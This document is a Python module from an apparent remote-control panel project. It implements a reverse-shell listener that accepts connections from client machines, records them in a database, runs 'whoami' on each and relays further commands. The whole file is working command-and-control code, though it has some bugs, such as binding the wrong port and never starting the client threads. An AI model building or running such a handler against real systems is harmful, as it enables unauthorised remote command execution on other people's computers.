#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
    File:   modules/shell.py
    Author: codeuk
    Date:   18/07/2022
    Python: 3.10
    Note:   This file is not currently in use! (for a future update)
"""

import socket
import threading

from .database import DB
from typing import Optional

class SimpleShell:
    """ Simple Reverse Shell for User Page (/user/<id>) """

    def __init__(
        self,
        port: Optional[int] = 6666,
        host: Optional[int] = "localhost",
    ):
        self.port = port
        self.host = host
        self.buff = 1024 * 128
        self.threads = []
        self.ipaddrs = []
        self.clients = []
        self._amount = 1
        self._socket = None

    @staticmethod
    def StartThreads(threads: int, func: callable, args: list) -> None:
        for _ in range(threads):
            t = threading.Thread(target=func, args=(args,))
            t.start()

    @staticmethod
    def ClientThread(c: socket.socket):
        while True:
            try:
                out = c.recv(8192).decode()
                if out == "": continue
                print(out)
            except Exception as out:
                print("Client has forcibly closed remote connection")
                c.close()

    @staticmethod
    def ExecuteCommand(client: socket.socket, cmd: str) -> str:
        client.send(cmd.encode())
        try:
            out = client.recv(8192).decode()
            print(out)
        except:
            out = "ConnectionAbortedError"
        finally:
            return out

    def Main(self) -> None:
        try:
            for i in range(self._amount):
                cur_port = self.port + i
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)   
                s.bind((self.host, self.port))
                s.listen(0)
                self.clients.append(s)
                print(f"simpleshell: <listening> {self.host}:{cur_port}")

            while True:
                for j in range(len(self.clients)):
                    conn, addr = self.clients[j].accept()
                    print(f"simpleshell: <connection> {addr[0]}:{addr[1]}")
                    DB.socketclients.append(f"{conn.recv(8192).decode()}")
                    self.ExecuteCommand(conn, "whoami")

                    thread = threading.Thread(target=self.ClientThread, args=(conn,))
                    self.threads.append(thread)
            s.close()

        except KeyboardInterrupt as msg:
            exit()

if __name__ == "__main__":
    s = SimpleShell(6666, "localhost")
    s.Main()